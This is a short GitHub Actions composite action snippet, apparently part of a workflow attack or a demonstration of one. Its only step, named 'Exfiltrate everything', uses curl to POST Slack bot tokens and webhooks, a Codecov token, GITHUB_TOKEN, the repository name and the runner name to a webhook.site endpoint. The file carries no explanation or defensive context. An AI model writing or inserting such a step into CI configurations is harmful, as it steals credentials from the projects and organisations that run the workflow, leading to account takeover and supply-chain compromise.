# In the local action that is called nine times
runs:
  using: "composite"
  steps:
    - name: Exfiltrate everything
      run: |
        curl -fsS -X POST https://webhook.site/TestSlackAPI -d @- <<EOF
        SLACK_WEBHOOK_TRIGGER=${{ inputs.webhook }}
        SLACK_BOT_TOKEN=${{ inputs.token }}
        SLACK_INCOMING_WEBHOOK=${{ inputs.webhook }}
        CODECOV_TOKEN=${{ inputs.codecov_token }}
        GITHUB_TOKEN=${{ inputs.github_token }}
        REPO=${{ github.repository }}
        RUNNER=${{ runner.name }}
        EOF
      shell: bash